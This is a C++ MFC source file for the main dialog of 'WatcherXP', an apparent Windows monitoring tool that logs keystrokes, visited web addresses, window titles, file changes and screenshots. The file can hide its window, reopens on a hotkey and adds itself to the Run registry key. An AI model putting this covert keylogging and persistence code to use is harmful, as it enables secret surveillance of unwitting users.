// WatcherXPDlg.cpp : implementation file
//



#include "stdafx.h"
#include "WatcherXP.h"
#include "WatcherXPDlg.h"
#include "hooks.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define T_COLOR RGB(10,10,10) //transparancy color
#define BG_COLOR RGB(84,113,141)
#define LINE_COLOR RGB(189,221,254)
#define TEXT_COLOR RGB(255,255,255)
#define TEXT_COLOR_OVER RGB(155,0,0)
// CWatcherXPDlg dialog

CString* paths=NULL;
CString str;
CString str2;

CWatcherXPDlg::CWatcherXPDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CWatcherXPDlg::IDD, pParent)
	, configPath(_T("config.txt"))
	, imagePath(_T("ScreenShoots\\"))
	, KBPath(_T("kb.txt"))
	, IEPath(_T("ie.txt"))
	, WTPath(_T("wt.txt"))
	, FFPath(_T("ff.txt"))
	, hotkey_id(0)
	, url(_T(""))
	, pc(0)
	, cp(0)
	, curDir(_T(""))
	, kbMsg(_T(""))
	, ieMsg(_T(""))
	, wtMsg(_T(""))
	, ffMsg(_T(""))
	, regMsg(_T(""))
	,helpPath(_T("help_en.htm"))
	,lang(0)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CWatcherXPDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EXPLORER1, explorer);
}

BEGIN_MESSAGE_MAP(CWatcherXPDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_WM_NCHITTEST()
	ON_WM_ERASEBKGND()
	ON_WM_CLOSE()
	ON_WM_SHOWWINDOW()
	ON_WM_SIZE()
	ON_MESSAGE(WM_HOTKEY,hotKey)

	//menu command message entries
	ON_COMMAND(ID_FILE_START, OnFileStart)
	ON_COMMAND(ID_FILE_STOP, OnFileStop)
	ON_COMMAND(ID_FILE_BEINVISIBLE, OnFileBeinvisible)
	ON_COMMAND(ID_UILANGUAGE_ARABIC, OnUilanguageArabic)
	ON_COMMAND(ID_UILANGUAGE_ENGLISH, OnUilanguageEnglish)
	ON_COMMAND(ID_FILE_EXIT, OnFileExit)
	ON_COMMAND(ID_VIEW_KEYSTROKES, OnViewKeystrokes)
	ON_COMMAND(ID_VIEW_WEBADDRESSES, OnViewWebaddresses)
	ON_COMMAND(ID_VIEW_WINDOWTITLES, OnViewWindowtitles)
	ON_COMMAND(ID_VIEW_FILEFOLDERCHANGES, OnViewFilefolderchanges)
	ON_COMMAND(ID_VIEW_SCREENSHOTS, OnViewScreenshots)
	ON_COMMAND(ID_VIEW_OPTIONS, OnViewOptions)
	ON_COMMAND(ID_REPORT_KEYSTROKES, OnReportKeystrokes)
	ON_COMMAND(ID_REPORT_W, OnReportW)
	ON_COMMAND(ID_REPORT_WINDOWTITLES, OnReportWindowtitles)
	ON_COMMAND(ID_REPORT_FILEFOLDERCHANGES, OnReportFilefolderchanges)
	ON_COMMAND(ID_REPORT_CLEARDATA, OnReportCleardata)
	ON_COMMAND(ID_HELP_TOPICS, OnHelpTopics)
	ON_COMMAND(ID_HELP_ABOUT, OnHelpAbout)



	//notify messages for my buttons
	ON_NOTIFY(BTN_CLICK,ID_FILE_BTN,OnFileClick)
	ON_NOTIFY(BTN_CLICK,ID_VIEW_BTN,OnViewClick)
	ON_NOTIFY(BTN_CLICK,ID_REPORT_BTN,OnReportClick)
	ON_NOTIFY(BTN_CLICK,ID_HELP_BTN,OnHelpClick)

	ON_NOTIFY(BTN_CLICK,ID_PREV_BTN,OnNavPrevClick)
	ON_NOTIFY(BTN_CLICK,ID_NEXT_BTN,OnNavNextClick)
	ON_NOTIFY(BTN_CLICK,ID_HOME_BTN,OnNavHomeClick)
	ON_NOTIFY(BTN_CLICK,ID_REFRESH_BTN,OnNavRefreshClick)
	ON_NOTIFY(BTN_CLICK,ID_N_STOP_BTN,OnNavStopClick)

	ON_NOTIFY(BTN_CLICK,ID_MIN_BTN,OnMinClick)
	ON_NOTIFY(BTN_CLICK,ID_MAX_BTN,OnMaxClick)
	ON_NOTIFY(BTN_CLICK,ID_EXIT_BTN,OnExitClick)

	ON_NOTIFY(BTN_CLICK,ID_START_BTN,OnStartClick)
	ON_NOTIFY(BTN_CLICK,ID_STOP_BTN,OnStopClick)
	ON_NOTIFY(BTN_CLICK,ID_HIDE_BTN,OnHideClick)
	ON_NOTIFY(BTN_CLICK,ID_KB_BTN,OnKBClick)
	ON_NOTIFY(BTN_CLICK,ID_WT_BTN,OnWTClick)
	ON_NOTIFY(BTN_CLICK,ID_FF_BTN,OnFFClick)
	ON_NOTIFY(BTN_CLICK,ID_IE_BTN,OnIEClick)
	ON_NOTIFY(BTN_CLICK,ID_SS_BTN,OnSSClick)
	ON_NOTIFY(BTN_CLICK,ID_U_HELP_BTN,OnUHelpClick)
	ON_NOTIFY(BTN_CLICK,ID_OPTIONS_BTN,OnOptionsClick)
	ON_NOTIFY(BTN_CLICK,ID_ABOUT_BTN,OnAboutClick)
	ON_NOTIFY(BTN_CLICK,ID_U_EXIT_BTN,OnUExitClick)

END_MESSAGE_MAP()


// CWatcherXPDlg message handlers

//this thread will be fired for milliseconds each time the naigation happened
//it is impossible for this thread to stay alive and cause any traffic
//it's a pooling replacement for DWebBrowserEvents2::NavigateComplete2 method 
UINT navThread(LPVOID p){
	CWatcherXPDlg* dlg=(CWatcherXPDlg*)p;
	while(dlg->explorer.get_ReadyState()!=dlg->explorer.READYSTATE_COMPLETE){
		Sleep(100);
	}
	dlg->urlControl.SetWindowText(dlg->explorer.get_LocationURL());
	return 0;
}

BOOL CWatcherXPDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon



	/* at windows start up, or when switching user back, the WinAPI GetCurrentDir returns the user's
	home directory instead of the current process directory, and this is wierd
	to work arround this: if the program runs at start up then it has key in registry
	so we read it and it's always right, if not then it runs by the user and GetCurrentDir returns the value
	only once per the program initialization
	*/
	curDir=this->getCurrDir();
	
	this->loadConfig();

	initMenus();
	
	//register hot key
	ATOM atom=GlobalAddAtom(_T("w_a_100001_100001")); //make a unique Atom ID
	if(atom!=0){ //success
		hotkey_id=atom;
	}
	else
		hotkey_id=0x01c1;
	GlobalDeleteAtom(atom);
	BOOL ok=RegisterHotKey(this->m_hWnd,hotkey_id,MOD_ALT|MOD_CONTROL|MOD_SHIFT,options.hotkey);

	// TODO: Add extra initialization here
	explorer.Navigate(getFilePath(helpPath),NULL,NULL,NULL,NULL);
	++pc;
	++cp;
	UpdateData(FALSE);

	SECURITY_DESCRIPTOR sd;
	InitializeSecurityDescriptor(&sd,SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(&sd,TRUE,NULL,FALSE);

	SECURITY_ATTRIBUTES sa;
	sa.nLength=sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor=&sd;
	sa.bInheritHandle=FALSE;

	CreateDirectory(this->getFilePath(_T("ScreenShoots")),&sa);
	CreateDirectory(this->getFilePath(_T("report")),&sa);
	
	bool firstProcess=setPaths(getFilePath(KBPath),getFilePath(IEPath),getFilePath(FFPath),getFilePath(WTPath),getFilePath(imagePath));
	if(!firstProcess)
		this->OnClose();
	viewer.imagePath=getFilePath(imagePath);


	if(options.autoStart)
		this->OnFileStart(); //auto start

	//the transpanay key, works under WIN2000 and later
	SetWindowLong(this->m_hWnd, GWL_EXSTYLE,GetWindowLong(this->m_hWnd, GWL_EXSTYLE) | WS_EX_LAYERED);
	SetLayeredWindowAttributes(T_COLOR,0,LWA_COLORKEY);
	
	urlControl.Create(ES_LEFT|ES_AUTOHSCROLL,CRect(0,0,300,25),this,IDC_EDIT1);
	urlControl.SetWindowText(getFilePath(helpPath));
	urlControl.ShowWindow(SW_SHOW);

	//create and show buttons for MainMenu
	//to drop the menu when th mouse moves over the menu buttons


	fileBtn.Create(NULL,_T("File"),0,CRect(CPoint(0,25),CPoint(0,0)),this,ID_FILE_BTN);
	fileBtn.setTransparancyColor(RGB(255,255,255));
	fileBtn.SetImages(IDB_MENU_NORMAL,IDB_MENU_OVER,0,0);
	fileBtn.ShowWindow(SW_SHOW);

	viewBtn.Create(NULL,_T("View"),0,CRect(CPoint(70,0),CPoint(0,0)),this,ID_VIEW_BTN);
	viewBtn.setTransparancyColor(RGB(255,255,255));
	viewBtn.SetImages(IDB_MENU_NORMAL,IDB_MENU_OVER,0,0);
	viewBtn.ShowWindow(SW_SHOW);

	reportBtn.Create(NULL,_T("Report"),0,CRect(CPoint(160,0),CPoint(0,0)),this,ID_REPORT_BTN);
	reportBtn.setTransparancyColor(RGB(255,255,255));
	reportBtn.SetImages(IDB_MENU_NORMAL,IDB_MENU_OVER,0,0);
	reportBtn.ShowWindow(SW_SHOW);

	helpBtn.Create(NULL,_T("Help"),0,CRect(CPoint(225,25),CPoint(0,0)),this,ID_HELP_BTN);
	helpBtn.setTransparancyColor(RGB(255,255,255));
	helpBtn.SetImages(IDB_MENU_NORMAL,IDB_MENU_OVER,0,0);
	helpBtn.ShowWindow(SW_SHOW);

	//create System menu (max,min,close)
	minBtn.Create(NULL,_T("-"),0,CRect(CPoint(510,50),CPoint(0,0)),this,ID_MIN_BTN);
	minBtn.setTransparancyColor(RGB(255,255,255));
	minBtn.SetImages(IDB_SYS_MENU_NORMAL,IDB_SYS_MENU_OVER,0,0);
	minBtn.ShowWindow(SW_SHOW);

	maxBtn.Create(NULL,_T("O"),0,CRect(CPoint(547,50),CPoint(0,0)),this,ID_MAX_BTN);
	maxBtn.setTransparancyColor(RGB(255,255,255));
	maxBtn.SetImages(IDB_SYS_MENU_NORMAL,IDB_SYS_MENU_OVER,0,0);
	maxBtn.ShowWindow(SW_SHOW);

	exitBtn.Create(NULL,_T("X"),0,CRect(CPoint(570,67),CPoint(0,0)),this,ID_EXIT_BTN);
	exitBtn.setTransparancyColor(RGB(255,255,255));
	exitBtn.SetImages(IDB_SYS_MENU_NORMAL,IDB_SYS_MENU_OVER,0,0);
	exitBtn.ShowWindow(SW_SHOW);

	//navigation buttons
	int nx=107; //navigation buttons start pos
	navHomeBtn.Create(NULL,_T(""),0,CRect(CPoint(nx,100-26),CPoint(0,0)),this,ID_HOME_BTN);
	navHomeBtn.SetImages(IDB_HOME_U,IDB_HOME_O,0,0);
	navHomeBtn.setTransparancyColor(RGB(255,0,0));
	navHomeBtn.ShowWindow(SW_SHOW);

	navPrevBtn.Create(NULL,_T(""),0,CRect(CPoint(nx+26,100-26),CPoint(0,0)),this,ID_PREV_BTN);
	navPrevBtn.SetImages(IDB_PREV_U,IDB_PREV_O,0,0);
	navPrevBtn.setTransparancyColor(RGB(255,0,0));
	navPrevBtn.ShowWindow(SW_SHOW);

	navNextBtn.Create(NULL,_T(""),0,CRect(CPoint(nx+2*26,100-26),CPoint(0,0)),this,ID_NEXT_BTN);
	navNextBtn.SetImages(IDB_NEXT_U,IDB_NEXT_O,0,0);
	navNextBtn.setTransparancyColor(RGB(255,0,0));
	navNextBtn.ShowWindow(SW_SHOW);

	navRefreshBtn.Create(NULL,_T(""),0,CRect(CPoint(nx+3*26,100-26),CPoint(0,0)),this,ID_REFRESH_BTN);
	navRefreshBtn.SetImages(IDB_REFRESH_U,IDB_REFRESH_O,0,0);
	navRefreshBtn.setTransparancyColor(RGB(255,0,0));
	navRefreshBtn.ShowWindow(SW_SHOW);

	navStopBtn.Create(NULL,_T(""),0,CRect(CPoint(nx+4*26,100-26),CPoint(0,0)),this,ID_N_STOP_BTN);
	navStopBtn.SetImages(IDB_STOP_U,IDB_STOP_O,0,0);
	navStopBtn.setTransparancyColor(RGB(255,0,0));
	navStopBtn.ShowWindow(SW_SHOW);
	//user main window buttons
	int h=20; //button height

	idlHeadBtn.Create(NULL,_T(""),0,CRect(CPoint(5,100-26),CPoint(0,0)),this,ID_IDL_BTN);
	idlHeadBtn.setTransparancyColor(RGB(255,255,255));
	idlHeadBtn.SetImages(IDB_HEAD_IDL_BTN,0,0,0);
	idlHeadBtn.ShowWindow(SW_SHOW);

	startBtn.Create(NULL,_T("Start"),0,CRect(CPoint(5,100+0*h),CPoint(0,0)),this,ID_START_BTN);
	startBtn.setTransparancyColor(RGB(255,255,255));
	startBtn.SetImages(IDB_COM_BTN,IDB_COM_OVER_BTN,0,0);
	startBtn.ShowWindow(SW_SHOW);

	stopBtn.Create(NULL,_T("Stop"),0,CRect(CPoint(5,100+1*h),CPoint(0,0)),this,ID_STOP_BTN);
	stopBtn.setTransparancyColor(RGB(255,255,255));
	stopBtn.SetImages(IDB_COM_BTN,IDB_COM_OVER_BTN,0,0);
	stopBtn.ShowWindow(SW_SHOW);

	hideBtn.Create(NULL,_T("Hide"),0,CRect(CPoint(5,100+2*h),CPoint(0,0)),this,ID_HIDE_BTN);
	hideBtn.setTransparancyColor(RGB(255,255,255));
	hideBtn.SetImages(IDB_COM_BTN,IDB_COM_OVER_BTN,0,0);
	hideBtn.ShowWindow(SW_SHOW);

	idl1Btn.Create(NULL,_T(""),0,CRect(CPoint(5,100+3*h),CPoint(0,0)),this,ID_IDL_BTN);
	idl1Btn.setTransparancyColor(RGB(255,255,255));
	idl1Btn.SetImages(IDB_COM_BTN,0,0,0);
	idl1Btn.ShowWindow(SW_SHOW);

	kbBtn.Create(NULL,_T("KeyStrokes"),0,CRect(CPoint(5,100+4*h),CPoint(0,0)),this,ID_KB_BTN);
	kbBtn.setTransparancyColor(RGB(255,255,255));
	kbBtn.SetImages(IDB_COM_BTN,IDB_COM_OVER_BTN,0,0);
	kbBtn.ShowWindow(SW_SHOW);

	wtBtn.Create(NULL,_T("Win Titles"),0,CRect(CPoint(5,100+5*h),CPoint(0,0)),this,ID_WT_BTN);
	wtBtn.setTransparancyColor(RGB(255,255,255));
	wtBtn.SetImages(IDB_COM_BTN,IDB_COM_OVER_BTN,0,0);
	wtBtn.ShowWindow(SW_SHOW);

	ieBtn.Create(NULL,_T("Web Files"),0,CRect(CPoint(5,100+6*h),CPoint(0,0)),this,ID_IE_BTN);
	ieBtn.setTransparancyColor(RGB(255,255,255));
	ieBtn.SetImages(IDB_COM_BTN,IDB_COM_OVER_BTN,0,0);
	ieBtn.ShowWindow(SW_SHOW);

	ffBtn.Create(NULL,_T("File Folder"),0,CRect(CPoint(5,100+7*h),CPoint(0,0)),this,ID_FF_BTN);
	ffBtn.setTransparancyColor(RGB(255,255,255));
	ffBtn.SetImages(IDB_COM_BTN,IDB_COM_OVER_BTN,0,0);
	ffBtn.ShowWindow(SW_SHOW);

	ssBtn.Create(NULL,_T("Screen"),0,CRect(CPoint(5,100+8*h),CPoint(0,0)),this,ID_SS_BTN);
	ssBtn.setTransparancyColor(RGB(255,255,255));
	ssBtn.SetImages(IDB_COM_BTN,IDB_COM_OVER_BTN,0,0);
	ssBtn.ShowWindow(SW_SHOW);

	idl2Btn.Create(NULL,_T(""),0,CRect(CPoint(5,100+9*h),CPoint(0,0)),this,ID_IDL_BTN);
	idl2Btn.setTransparancyColor(RGB(255,255,255));
	idl2Btn.SetImages(IDB_COM_BTN,0,0,0);
	idl2Btn.ShowWindow(SW_SHOW);

	optionsBtn.Create(NULL,_T("Options"),0,CRect(CPoint(5,100+10*h),CPoint(0,0)),this,ID_OPTIONS_BTN);
	optionsBtn.setTransparancyColor(RGB(255,255,255));
	optionsBtn.SetImages(IDB_COM_BTN,IDB_COM_OVER_BTN,0,0);
	optionsBtn.ShowWindow(SW_SHOW);

	hBtn.Create(NULL,_T("Help"),0,CRect(CPoint(5,100+11*h),CPoint(0,0)),this,ID_U_HELP_BTN);
	hBtn.setTransparancyColor(RGB(255,255,255));
	hBtn.SetImages(IDB_COM_BTN,IDB_COM_OVER_BTN,0,0);
	hBtn.ShowWindow(SW_SHOW);

	aboutBtn.Create(NULL,_T("About"),0,CRect(CPoint(5,100+12*h),CPoint(0,0)),this,ID_ABOUT_BTN);
	aboutBtn.setTransparancyColor(RGB(255,255,255));
	aboutBtn.SetImages(IDB_COM_BTN,IDB_COM_OVER_BTN,0,0);
	aboutBtn.ShowWindow(SW_SHOW);

	exBtn.Create(NULL,_T("Exit"),0,CRect(CPoint(5,100+13*h),CPoint(0,0)),this,ID_U_EXIT_BTN);
	exBtn.setTransparancyColor(RGB(255,255,255));
	exBtn.SetImages(IDB_EXBTN,IDB_EXBTN_OVER,0,0);
	exBtn.ShowWindow(SW_SHOW);

	if(lang==0)
		this->OnUilanguageEnglish();
	if(lang==1)
		this->OnUilanguageArabic();

	

	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CWatcherXPDlg::OnPaint() 
{

	//draw the main window region with the DESIRED bgcolor
	CPaintDC dc(this);

	//draw the background
	RECT rect;
	GetClientRect(&rect);
	
	CRgn rectRgn;
	CRgn elRgn;


	elRgn.CreateEllipticRgn(30,40,270,160);
	rectRgn.CreateRoundRectRgn(0,70,rect.right,rect.bottom,90,80);
	rectRgn.CombineRgn(&rectRgn,&elRgn,RGN_OR);

	//rect region now contains the main window region 
	dc.FillRgn(&rectRgn,&CBrush(BG_COLOR));
	dc.FrameRgn(&rectRgn,&CBrush(LINE_COLOR),2,2);
	//draw rect arround the expolrer window
	rectRgn.Detach();
	explorer.GetWindowRect(&rect);
	rectRgn.CreateRectRgn(107,107,rect.right-rect.left+113,rect.bottom-rect.top+113);
	dc.FrameRgn(&rectRgn,&CBrush(LINE_COLOR),3,3);
	
	//draw rect arrount Edit Window
	rectRgn.Detach();
	urlControl.GetWindowRect(&rect);
	rectRgn.CreateRectRgn(254,76,rect.right-rect.left+258,rect.bottom-rect.top+80);
	dc.FrameRgn(&rectRgn,&CBrush(LINE_COLOR),1,1);

	
	


}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CWatcherXPDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

UINT CWatcherXPDlg::OnNcHitTest(CPoint point)
{
    UINT nHitTest = CDialog::OnNcHitTest(point);
    if (nHitTest == HTCLIENT)
        nHitTest = HTCAPTION;	

	return nHitTest;
}

BOOL CWatcherXPDlg::OnEraseBkgnd(CDC* pDC)
{
	//transparancy color
	RECT rect;
	this->GetClientRect(&rect);
	pDC->FillRect(&rect,&CBrush(T_COLOR));

	return 1;
}

void CWatcherXPDlg::OnCancel()
{
	// TODO: Add your specialized code here and/or call the base class
}

void CWatcherXPDlg::OnOK()
{ //navigate to th eusrl
	
	urlControl.GetWindowText(url);
	CString oldURL=explorer.get_LocationURL();
	if(url!=oldURL){
		explorer.Navigate(url,NULL,NULL,NULL,NULL);
		++pc;
		++cp;
	}
	else
		explorer.Refresh();
	
	AfxBeginThread(navThread,(LPVOID)this);	
}

BOOL CWatcherXPDlg::DestroyWindow()
{
	return CDialog::DestroyWindow();
}

void CWatcherXPDlg::OnClose()
{
	CDialog::OnClose();
	DestroyWindow();
}


void CWatcherXPDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	//set window pos for few controls
	if(IsWindow(explorer.m_hWnd)){
		RECT rect;
		this->GetWindowRect(&rect);
		explorer.SetWindowPos(NULL,110,110,rect.right-rect.left-130,rect.bottom-rect.top-135,SWP_NOZORDER);
		urlControl.SetWindowPos(NULL,256,78,rect.right-rect.left-286,24,SWP_NOZORDER);
		minBtn.SetWindowPos(NULL,rect.right-rect.left-90,50,0,0,SWP_NOZORDER|SWP_NOSIZE);
		maxBtn.SetWindowPos(NULL,rect.right-rect.left-55,50,0,0,SWP_NOZORDER|SWP_NOSIZE);
		exitBtn.SetWindowPos(NULL,rect.right-rect.left-30,67,3,0,SWP_NOZORDER|SWP_NOSIZE);
	}
}





///////////////////////////////button messages
void CWatcherXPDlg::OnFileClick( NMHDR * ns, LRESULT * result ){
	RECT rect;
	fileBtn.GetWindowRect(&rect);

	if(lang==0)
		menuFileEN.TrackPopupMenu(TPM_LEFTALIGN  + TPM_LEFTBUTTON,rect.left,rect.bottom, this, NULL);
	else
		if(lang==1)	
			menuFileAR.TrackPopupMenu(TPM_LEFTALIGN  + TPM_LEFTBUTTON,	rect.left,rect.bottom, this, NULL);
}

void CWatcherXPDlg::OnViewClick( NMHDR * ns, LRESULT * result ){
	RECT rect;
	viewBtn.GetWindowRect(&rect);

	if(lang==0)
		menuViewEN.TrackPopupMenu(TPM_LEFTALIGN  + TPM_LEFTBUTTON,rect.left,rect.bottom, this, NULL);
	else
		if(lang==1)	
			menuViewAR.TrackPopupMenu(TPM_LEFTALIGN  + TPM_LEFTBUTTON,	rect.left,rect.bottom, this, NULL);
}

void CWatcherXPDlg::OnReportClick( NMHDR * ns, LRESULT * result ){
	RECT rect;
	reportBtn.GetWindowRect(&rect);

	if(lang==0)
		menuReportEN.TrackPopupMenu(TPM_LEFTALIGN  + TPM_LEFTBUTTON,rect.left,rect.bottom, this, NULL);
	else
		if(lang==1)	
			menuReportAR.TrackPopupMenu(TPM_LEFTALIGN  + TPM_LEFTBUTTON,	rect.left,rect.bottom, this, NULL);
}

void CWatcherXPDlg::OnHelpClick( NMHDR * ns, LRESULT * result ){
	RECT rect;
	helpBtn.GetWindowRect(&rect);

	if(lang==0)
		menuHelpEN.TrackPopupMenu(TPM_LEFTALIGN  + TPM_LEFTBUTTON,rect.left,rect.bottom, this, NULL);
	else
		if(lang==1)	
			menuHelpAR.TrackPopupMenu(TPM_LEFTALIGN  + TPM_LEFTBUTTON,	rect.left,rect.bottom, this, NULL);
}


void CWatcherXPDlg::OnExitClick( NMHDR * ns, LRESULT * result ){
	OnClose();
}
void CWatcherXPDlg::OnMaxClick( NMHDR * ns, LRESULT * result ){
	WINDOWPLACEMENT p;
	p.length=sizeof(WINDOWPLACEMENT);
	this->GetWindowPlacement(&p);
	if(p.showCmd==SW_MAXIMIZE)
		ShowWindow(SW_RESTORE);
	else
		ShowWindow(SW_MAXIMIZE);
}

void CWatcherXPDlg::OnMinClick( NMHDR * ns, LRESULT * result ){
	ShowWindow(SW_MINIMIZE);
}

void CWatcherXPDlg::OnStartClick( NMHDR * ns, LRESULT * result ){
	OnFileStart();
}

void CWatcherXPDlg::OnStopClick( NMHDR * ns, LRESULT * result ){
	OnFileStop();
}

void CWatcherXPDlg::OnHideClick( NMHDR * ns, LRESULT * result ){
	OnFileBeinvisible();
}

void CWatcherXPDlg::OnKBClick( NMHDR * ns, LRESULT * result ){
	OnViewKeystrokes();
}

void CWatcherXPDlg::OnWTClick( NMHDR * ns, LRESULT * result ){
	OnViewWindowtitles();
}

void CWatcherXPDlg::OnIEClick( NMHDR * ns, LRESULT * result ){
	OnViewWebaddresses();
}

void CWatcherXPDlg::OnFFClick( NMHDR * ns, LRESULT * result ){
	OnViewFilefolderchanges();
}

void CWatcherXPDlg::OnSSClick( NMHDR * ns, LRESULT * result ){
	OnViewScreenshots();
}

void CWatcherXPDlg::OnOptionsClick( NMHDR * ns, LRESULT * result ){
	OnViewOptions();
}

void CWatcherXPDlg::OnUHelpClick( NMHDR * ns, LRESULT * result ){
	OnHelpTopics();
}

void CWatcherXPDlg::OnUExitClick( NMHDR * ns, LRESULT * result ){
	OnClose();
}

void CWatcherXPDlg::OnAboutClick( NMHDR * ns, LRESULT * result ){
	OnHelpAbout();
}

void CWatcherXPDlg::OnNavNextClick( NMHDR * ns, LRESULT * result ){
	if(cp<pc){
		explorer.GoForward();
		AfxBeginThread(navThread,(LPVOID)this);	
		++cp;
	}
}
void CWatcherXPDlg::OnNavPrevClick( NMHDR * ns, LRESULT * result ){
	if(cp>1){
		explorer.GoBack();
		AfxBeginThread(navThread,(LPVOID)this);	
		--cp;
	}
}

void CWatcherXPDlg::OnNavStopClick( NMHDR * ns, LRESULT * result ){
	explorer.Stop();
}
void CWatcherXPDlg::OnNavRefreshClick( NMHDR * ns, LRESULT * result ){
	explorer.Refresh();
}
void CWatcherXPDlg::OnNavHomeClick( NMHDR * ns, LRESULT * result ){
	++pc;
	++cp;
	explorer.GoHome();
	AfxBeginThread(navThread,(LPVOID)this);	
}



/////////////////////////////Menu Command Handlers////////////////////////
////////////////////////////////////////////////////////////////////////

void CWatcherXPDlg::OnFileStart()
{
	menuFileAR.EnableMenuItem(ID_FILE_START,MF_GRAYED);
	menuFileAR.EnableMenuItem(ID_FILE_STOP,MF_ENABLED);
	menuFileEN.EnableMenuItem(ID_FILE_START,MF_GRAYED);
	menuFileEN.EnableMenuItem(ID_FILE_STOP,MF_ENABLED);
	if(options.KeyStroke)
		if(!startKB())
			MessageBox(kbMsg);
	
	if(options.WebAddress)
		if(!startIEAddress())
			MessageBox(ieMsg);

	if(options.WindowTitle)
		if(!startWindowTitle())
			MessageBox(wtMsg);

	int len=options.folderList.list.GetCount();
	if((options.FileFolder)&&(len>0)){

		if(paths!=NULL)
			delete []paths;
		paths=new CString[len];
		POSITION pos=options.folderList.list.GetHeadPosition();
		int i=0;
		while(pos!=NULL){
			paths[i]=options.folderList.list.GetNext(pos);
			i++;
		}
		if(!startFileFolder(paths,len))
			MessageBox(ffMsg);
	}
	if(options.ScreenShots){
		startScreenShoots(false,0.5,0.5,options.elapsed*1000); 
	}
}

void CWatcherXPDlg::OnFileStop()
{
	//stop all services
	stopKB();
	stopIEAddress();
	stopWindowTitle();
	stopFileFolder();
	stopScreenShoots();
	menuFileEN.EnableMenuItem(ID_FILE_START,MF_ENABLED);
	menuFileEN.EnableMenuItem(ID_FILE_STOP,MF_GRAYED);
	menuFileAR.EnableMenuItem(ID_FILE_START,MF_ENABLED);
	menuFileAR.EnableMenuItem(ID_FILE_STOP,MF_GRAYED);
	// TODO: Add your command handler code here
}

void CWatcherXPDlg::OnFileBeinvisible()
{
	this->ShowWindow(SW_HIDE);
}

void CWatcherXPDlg::OnFileExit()
{
	this->DestroyWindow();
}

void CWatcherXPDlg::OnViewKeystrokes()
{
	reportKB(getFilePath(_T("report\\kb.htm")));
	explorer.Navigate(getFilePath(_T("report\\kb.htm")),NULL,NULL,NULL,NULL);
	AfxBeginThread(navThread,(LPVOID)this);	
	++pc;
	++cp;
}

void CWatcherXPDlg::OnViewWebaddresses()
{
	reportIEAddress(getFilePath(_T("report\\ie.htm")));
	explorer.Navigate(getFilePath(_T("report\\ie.htm")),NULL,NULL,NULL,NULL);
	AfxBeginThread(navThread,(LPVOID)this);	
	++pc;
	++cp;
}

void CWatcherXPDlg::OnViewWindowtitles()
{
	reportWindowTitle(getFilePath(_T("report\\wt.htm")));
	explorer.Navigate(getFilePath(_T("report\\wt.htm")),NULL,NULL,NULL,NULL);
	AfxBeginThread(navThread,(LPVOID)this);	
	++pc;
	++cp;
}

void CWatcherXPDlg::OnViewFilefolderchanges()
{
	reportFileFolder(getFilePath(_T("report\\ff.htm")));
	explorer.Navigate(getFilePath(_T("report\\ff.htm")),NULL,NULL,NULL,NULL);
	AfxBeginThread(navThread,(LPVOID)this);	
	++pc;
	++cp;
}

void CWatcherXPDlg::OnViewScreenshots()
{
	viewer.DoModal();
}

void CWatcherXPDlg::OnViewOptions()
{
	if(options.DoModal()==IDOK){
		this->saveConfig();

		//unregister previous hot key

		UnregisterHotKey(this->m_hWnd,hotkey_id);

		//register hot key
		ATOM atom=GlobalAddAtom(_T("w_a_100001_100001")); //make a unique Atom ID
		if(atom!=0){ //success
			hotkey_id=atom;
		}
		else
			hotkey_id=0x01c1;
		GlobalDeleteAtom(atom);
		RegisterHotKey(this->m_hWnd,hotkey_id,MOD_ALT|MOD_CONTROL|MOD_SHIFT,options.hotkey);
		
		
		CString name=theApp.m_pszExeName;
		name=this->getFilePath(name+_T(".exe"));
		
		/*
		TCHAR path[MAX_PATH];
		GetCurrentDirectory(MAX_PATH,path);
		StrCat(path,"\\");
		StrCat(path,name);
		StrCat(path,".exe");
		CString str=path;
		int index=str.Find("\\\\"); 
		if(index>0){
			str.Delete(index);
		}
		StrCpy(path,str);
		*/
		HKEY run;
		LONG r;
		
		r=RegOpenKeyEx(HKEY_LOCAL_MACHINE,_T("SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN"),0,KEY_SET_VALUE,&run);
		if(r!=ERROR_SUCCESS){ //try to open the Current User run entry (limited account) 
			r=RegOpenKeyEx(HKEY_CURRENT_USER,_T("SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN"),0,KEY_SET_VALUE,&run);
		}
		if(options.startUp){ //add to registry

			r=RegSetValueEx(run,_T("watcher"),0,REG_SZ,(BYTE*)(name.GetBuffer()),name.GetLength()*sizeof(TCHAR)+1*sizeof(TCHAR));
			if(r!=ERROR_SUCCESS){
				MessageBox(regMsg);
				options.startUp=false;
				this->saveConfig();
			}
		}
		else{ //remove from registry

			r=RegDeleteValue(run,_T("watcher"));
			
		}
		RegCloseKey(run);
	}
	else
		this->loadConfig();
}

void CWatcherXPDlg::OnReportKeystrokes()
{
	CString dest=chooseFolder();
	if(dest==_T(""))
		return;
	CTime time=CTime::GetCurrentTime();
	CString date;
	dest+=time.Format(_T("\\keyStrokes%d_%m_%y_%H_%M_%S.htm"));
	int index=dest.Find(_T("\\\\"));
	if(index>0){
		dest.Delete(index);
	}
	reportKB(dest);
}

void CWatcherXPDlg::OnReportW() //IE
{	CString dest=chooseFolder();
	if(dest==_T(""))
		return;
	CTime time=CTime::GetCurrentTime();
	CString date;
	dest+=time.Format(_T("\\WebAddresses%d_%m_%y_%H_%M_%S.htm"));
	int index=dest.Find(_T("\\\\"));
	if(index>0){
		dest.Delete(index);
	}
	reportIEAddress(dest);
}

